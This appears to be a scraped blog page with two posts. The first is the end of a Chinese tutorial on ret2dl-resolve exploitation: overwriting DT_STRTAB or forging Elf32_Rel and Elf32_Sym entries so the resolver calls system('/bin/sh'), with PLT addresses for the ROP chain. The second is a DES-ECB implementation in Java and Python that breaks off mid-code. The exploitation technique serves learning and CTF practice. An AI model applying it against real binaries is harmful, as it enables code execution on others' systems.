<h2 id="改写-dynamic的DT-STRTAB"><a href="#改写-dynamic的DT-STRTAB" class="headerlink" title="改写.dynamic的DT_STRTAB"></a>改写.dynamic的DT_STRTAB</h2><p>这个只有在<strong>checksec</strong>时<strong>No RELRO</strong>可行，即<strong>.dynamic</strong>可写。因为<strong>ret2dl-resolve</strong>会从<strong>.dynamic</strong>里面拿.<strong>dynstr</strong>字符串表的指针，然后加上<strong>offset</strong>取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够<strong>改写</strong>这个指针到一块我们能够操纵的内存空间，当<strong>resolve</strong>的时候，就能<strong>resolve</strong>成我们所指定的任意库函数。比方说，原本是一个<strong>free</strong>函数，我们就把原本是<strong>free</strong>字符串的那个偏移位置设为<strong>system</strong>字符串，<strong>第一次</strong>调用<code>free(&quot;bin/sh&quot;)</code>（因为只有第一次才会resolve），就等于调用了<code>system(&quot;/bin/sh&quot;)</code></p>
<h2 id="操纵第二个参数，使其指向我们所构造的Elf32-Rel"><a href="#操纵第二个参数，使其指向我们所构造的Elf32-Rel" class="headerlink" title="操纵第二个参数，使其指向我们所构造的Elf32_Rel"></a>操纵第二个参数，使其指向我们所构造的Elf32_Rel</h2><p>如果<code>.dynamic</code>不可写，那么以上方法就没用了，所以有第二种利用方法。要知道，前面的<code>_dl_runtime_resolve</code>在第二步时</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; .rel.plt + 第二个参数`求出当前函数的重定位表项`Elf32_Rel`的指针，记作`rel</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>这个时候，<code>_dl_runtime_resolve</code>并没有检查<code>.rel.plt + 第二个参数</code>后是否造成越界访问，所以我们能给一个很大的<code>.rel.plt</code>的offset（64位的话就是下标），然后使得加上去之后的地址指向我们所能操纵的一块内存空间，比方说<code>.bss</code>。</p>
<p>然后第三步</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; rel-&gt;r_info &gt;&gt; 8`作为`.dynsym`的下标，求出当前函数的符号表项`Elf32_Sym`的指针，记作`sym</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p> 所以在我们所伪造的<code>Elf32_Rel</code>，需要放一个<code>r_info</code>字段，大概长这样就行<code>0xXXXXXX07</code>，其中XXXXXX是相对<code>.dynsym</code>表的下标，注意不是偏移，所以是偏移除以<code>Elf32_Sym</code>的大小，即除以<code>0x10</code>（32位下）。然后这里同样也没有进行越界访问的检查，所以可以用类似的方法，伪造出这个<code>Elf32_Sym</code>。至于为什么是07，因为这是一个导入函数，而导入函数一般都是07，所以写成07就好。</p>
<p>然后第四步</p>
<blockquote>
<p><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</p>
</blockquote>
<p>同样类似，没有进行越界访问检查，所以这个字符串也能够伪造。</p>
<p>所以，最终的利用思路，大概是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x80482d0</span>				push dword ptr [<span class="number">0x804a004</span>]</span><br><span class="line"><span class="number">0x80482d6</span>				jmp  dword ptr [<span class="number">0x804a008</span>]</span><br></pre></td></tr></table></figure>

<p>构造ROP，跳转到resolve的PLT，<code>push link_map</code>的位置，就是上图所示的这个地方。此时，栈中必须要有已经伪造好的指向伪造的<code>Elf32_Rel</code>的偏移，然后是返回地址（<code>system</code>的话无所谓），再然后是参数（如果是<code>system</code>函数的话就要是指向<code>&quot;/bin/sh\x00&quot;</code>的指针）</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/12/DES-ECB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/10/12/DES-ECB/" class="post-title-link" itemprop="url">DES-ECB</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-10-12 19:27:16" itemprop="dateCreated datePublished" datetime="2019-10-12T19:27:16-07:00">2019-10-12</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-13 10:27:56" itemprop="dateModified" datetime="2019-10-13T10:27:56-07:00">2019-10-13</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="软件系统设计"><a href="#软件系统设计" class="headerlink" title="软件系统设计"></a>软件系统设计</h2><h3 id="实现Feistel密码结构（64bit分组长度）"><a href="#实现Feistel密码结构（64bit分组长度）" class="headerlink" title="实现Feistel密码结构（64bit分组长度）"></a>实现Feistel密码结构（64bit分组长度）</h3><p>单独通过一个Feistel函数抽象了Feistel结构</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Feistel</span><span class="params">(ClearTxt,Key,Model)</span>:</span></span><br><span class="line">    <span class="comment">#Step 1 is CreateKey</span></span><br><span class="line">    keylist = createkey(Key)</span><br><span class="line">    print()</span><br><span class="line">    <span class="keyword">if</span> Model == <span class="number">1</span>:</span><br><span class="line">        keylist = keylist</span><br><span class="line">    <span class="keyword">if</span> Model == <span class="number">2</span>:</span><br><span class="line">        keylist = keylist[::<span class="number">-1</span>] <span class="comment">#INVERSEKEY</span></span><br><span class="line">    <span class="comment">#Step 2 is ClearTxt</span></span><br><span class="line">    text = DES_ECB(ClearTxt,keylist)</span><br><span class="line">    <span class="keyword">return</span>  text</span><br></pre></td></tr></table></figure>

<p>通过不同的加密轮函数和密钥生成结构就可以组合成不同的Feistel密码，通过不同的Key生成函数可以生成不同的子密钥数组</p>
<h3 id="DES算法实现"><a href="#DES算法实现" class="headerlink" title="DES算法实现"></a>DES算法实现</h3><h4 id="初始置换实现"><a href="#初始置换实现" class="headerlink" title="初始置换实现"></a>初始置换实现</h4><p>Java实现：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] IP(<span class="keyword">int</span>[] BinaryClearTxt)&#123;</span><br><span class="line">        <span class="keyword">int</span>[] IPTABLE = &#123;<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">                <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">                <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">                <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">                <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>,</span><br><span class="line">                <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">                <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">                <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>&#125;;</span><br><span class="line">        <span class="keyword">if</span>(BinaryClearTxt.length != <span class="number">64</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"Your key Text lenth is Error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; IPTABLE.length;i++)&#123;</span><br><span class="line">                ret[i] = BinaryClearTxt[IPTABLE[i]-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.print(<span class="string">"Source ClearText : "</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;BinaryClearTxt.length;i++)&#123;</span><br><span class="line">                System.out.print(BinaryClearTxt[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>Python实现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IP</span><span class="params">(ClearTxt)</span>:</span></span><br><span class="line">    IPTABLE = [<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">                 <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">                 <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">                 <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">                 <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>,</span><br><span class="line">                 <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">                 <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">                 <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>]</span><br><span class="line">    <span class="keyword">if</span> len(ClearTxt) != <span class="number">64</span>:</span><br><span class="line">        print(<span class="string">"Your key Text lenth is Error!"</span>)</span><br><span class="line">        <span class="keyword">assert</span> len(ClearTxt) == <span class="number">64</span>  <span class="comment"># if no 64bit error</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> IPTABLE:</span><br><span class="line">            ret = ret + ClearTxt[i - <span class="number">1</span>]</span><br><span class="line">        print(<span class="string">"Source ClearText : "</span>,ClearTxt)</span><br><span class="line">        print(<span class="string">"IP Replace : "</span>,ret)</span><br><span class="line">        <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure>

<h4 id="子密钥生成实现"><a href="#子密钥生成实现" class="headerlink" title="子密钥生成实现"></a>子密钥生成实现</h4><p>Java实现</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Key</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] Movetimes = &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span>[] PC_1_LTABLE = &#123;<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">            <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">            <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span>[] PC_1_RTABLE = &#123;<span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">            <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">            <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">            <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span>[] PC_2_TABLE = &#123;<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line">            <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">            <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">            <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>,</span><br><span class="line">            <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>,</span><br><span class="line">            <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>,</span><br><span class="line">            <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] Binarykey = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] Sonkey = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">16</span>][<span class="number">48</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">()</span><span class="comment">//(test pass) set Binarykey</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span>[] tmp = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">64</span>];</span><br><span class="line">        System.out.println(<span class="string">"Please input your Key ： "</span>);</span><br><span class="line">        String tmpchar = scan.next();</span><br><span class="line">        HextoBin hexto = <span class="keyword">new</span> HextoBin();</span><br><span class="line">        hexto.set(tmpchar);</span><br><span class="line">        String str2 = hexto.out();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">64</span>;i++)&#123;</span><br><span class="line">            Binarykey[i] = str2.charAt(i)-<span class="string">'0'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] result(<span class="keyword">int</span>[] txt,<span class="keyword">int</span> count)&#123;</span><br><span class="line">        <span class="keyword">int</span> lenth = txt.length;</span><br><span class="line">        <span class="keyword">int</span>[] tmptxt = <span class="keyword">new</span> <span class="keyword">int</span>[lenth];</span><br><span class="line">        <span class="keyword">if</span>(lenth &gt; <span class="number">28</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"Your Result length is Error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> tmpnum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = count;i &lt; lenth ;i++)&#123;</span><br><span class="line">                tmptxt[tmpnum] = txt[i];</span><br><span class="line">                tmpnum ++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; count;i++)&#123;</span><br><span class="line">                tmptxt[tmpnum+i] = txt[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tmptxt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] Main()&#123;</span><br><span class="line">        <span class="keyword">int</span> lenth = Binarykey.length;</span><br><span class="line">        <span class="keyword">if</span>(lenth != <span class="number">64</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"Your  Key lenth is Error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String BinarykeyST = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i &lt; lenth;i++)&#123;</span><br><span class="line">            BinarykeyST += Binarykey[i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"Your  Binary Key is : "</span>+BinarykeyST);</span><br><span class="line">        <span class="keyword">int</span>[] L0 = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">28</span>];</span><br><span class="line">        <span class="keyword">int</span>[] R0 = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">28</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; PC_1_LTABLE.length;i++)&#123;</span><br><span class="line">            L0[i] = Binarykey[PC_1_LTABLE[i] - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; PC_1_LTABLE.length;i++)&#123;</span><br><span class="line">            R0[i] = Binarykey[PC_1_RTABLE[i] - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">16</span>;i++)&#123;</span><br><span class="line">            L0 = result(L0,Movetimes[i]);</span><br><span class="line">            R0 = result(R0,Movetimes[i]);</span><br><span class="line">            <span class="keyword">int</span>[] mergedKey = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">56</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; <span class="number">28</span>;j++)&#123;</span><br><span class="line">                mergedKey[j] = L0[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">28</span>;j &lt; <span class="number">56</span>;j++)&#123;</span><br><span class="line">                mergedKey[j] = R0[j-<span class="number">28</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span>[] tempkey = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">48</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; PC_2_TABLE.length;j++)&#123;</span><br><span class="line">                tempkey[j] = mergedKey[PC_2_TABLE[j]-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j&lt;<span class="number">48</span>;j++)&#123;</span><br><span class="line">                Sonkey[i][j] = tempkey[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Sonkey;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Python实现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createkey</span><span class="params">(key)</span>:</span></span><br><span class="line">    Movetimes = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line">    PC_1_LTABLE = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">             <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">             <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">             <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>]</span><br><span class="line">    PC_1_RTABLE = [<span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">             <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">             <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">             <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>]</span><br><span class="line">    PC_2_TABLE = [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line">                        <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">                        <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>,</span><br><span class="line">                        <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">                        <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>,</span><br><span class="line">                        <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>,</span><br><span class="line">                        <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>,</span><br><span class="line">                        <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>]</span><br><span class="line">    <span class="keyword">if</span> len(key) != <span class="number">64</span> :</span><br><span class="line">        print(<span class="string">"Your Key lenth is Error!"</span>)</span><br><span class="line">        <span class="keyword">assert</span> len(key) == <span class="number">64</span><span class="comment">#if no 64bit error</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        L0 = <span class="string">""</span></span><br><span class="line">        R0 = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> PC_1_LTABLE:</span><br><span class="line">            L0 += key[i - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> PC_1_RTABLE:</span><br><span class="line">            R0 += key[i - <span 